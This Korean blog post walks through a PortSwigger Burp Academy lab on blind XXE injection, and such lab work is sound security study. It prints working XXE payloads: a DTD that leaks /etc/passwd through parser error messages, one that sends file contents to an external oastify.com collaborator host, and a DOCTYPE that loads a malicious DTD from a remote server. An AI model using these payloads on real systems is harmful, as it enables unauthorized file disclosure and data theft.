---
layout: post
title: "Burp Academy-XXE 취약점: Exploiting blind XXE to retrieve data via error messages"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XXE injection]
toc: true
last_modified_at: 2024-08-06 21:00:00 +0900
---


# 개요
- 문제 주소: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
- 취약점 설명: https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages
- 난이도: PRACTITIONER (중간)

# 랩 개요
- 이전 문제들과 마찬가지로 "Check stock" 기능을 통해 XML 을 삽입할 수 있다. 그러나 결과는 표시되지 않는다.  
- 랩을 풀려면 외부 DTD를 사용해서  `/etc/passwd`의 내용을 노출하는 에러를 유발시킨다. 
- DTD를 제공하기 위한 exploit서버가 주어졌다. 

```
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.
```

# 도전 

## 살펴보기 

이전 문제들과 마찬가지로 stock 체크를 하는 부분에서 XML 입력이 가능하다. 

## 취약점 설명에 있던 페이로드를 사용해서 XXE 인젝션 가능할지 테스트 
취약점 설명 페이지에 있었던 다음 페이로드를 사용해서 바로 테스트해본다. 

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

![](/images/burp-academy-xxe-6-1.png)

"Entities are not allowed for security reasons" 라는 메세지가 회신된다. Entity를 사용할 수 없다고 한다. 

## DTD를 exploit서버에 구성해서 재시도

xxe 문제 5번에서 썼던 테크닉을 써본다. 

collaborator URL을 획득하고 DTD를 구성해서 exploit서버에 저장한다. 

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://rqlgn1rkxwsqe24x7bscjua1rsxjl99y.oastify.com/?x=%file;'>">
%eval;
%exfil;
```

![](/images/burp-academy-xxe-6-2.png)


다음과 같은 파싱에러가 발생했다. 그런데 눈에 띄는 점이 하나 있다. x파라메터의 값이다. 에러 메세지에 DTD에서 지정한 file 변수의 값 (/etc/hostname의 값)이 들어가 있다!! 이 것을 활용하면 /etc/passwd의 값을 볼 수 있을 것 같다. 

```
"XML parser exited with error: org.xml.sax.SAXParseException; systemId: http://rqlgn1rkxwsqe24x7bscjua1rsxjl99y.oastify.com/?x=2dff9f769dcc; lineNumber: 1; columnNumber: 2; The markup declarations contained or pointed to by the document type declaration must be well-formed."
```

![](/images/burp-academy-xxe-6-3.png)


## /etc/passwd를 조회하도록 DTD를 수정해서 재시도 
DTD에서 /etc/hostname으로 되어 있는 부분을 /etc/passwd로 변경해서 다시 시도해본다. 

그러자 이번에는 다음과 같은 에러가 발생했다. URL에서 표현할 수 없는 캐릭터가 /etc/passwd에 있기 때문인 것으로 생각된다. 어떻게 해야할까... 

```
"XML parser exited with error: java.net.MalformedURLException: Illegal character in URL"
```

![](/images/burp-academy-xxe-6-4.png)


## 취약점 설명에 있던 페이로드를 exploit서버에 DTD로 저장한 후 시도

다시 한번 취약점 설명 페이지에서 소개된 페이로드를 살펴본다.이 페이로드는 collaborator 서버를 사용하지 않고 있다. 이하의 DTD를 exploit서버에 저장한 후에 테스트해보자. 

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

HTTP 요청시에는 다음과 같은 페이로드를 보낸다. 

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a8300690415a59982c9be9a012a003f.exploit-server.net/exploit"> %xxe;]>
```

시도해보면 에러의 내용이 응답에 포함된 것을 확인할 수 있다. 문제 풀이에 성공했다! 🍖

![](/images/burp-academy-xxe-6-5.png)


![](/images/burp-academy-xxe-6-success.png)



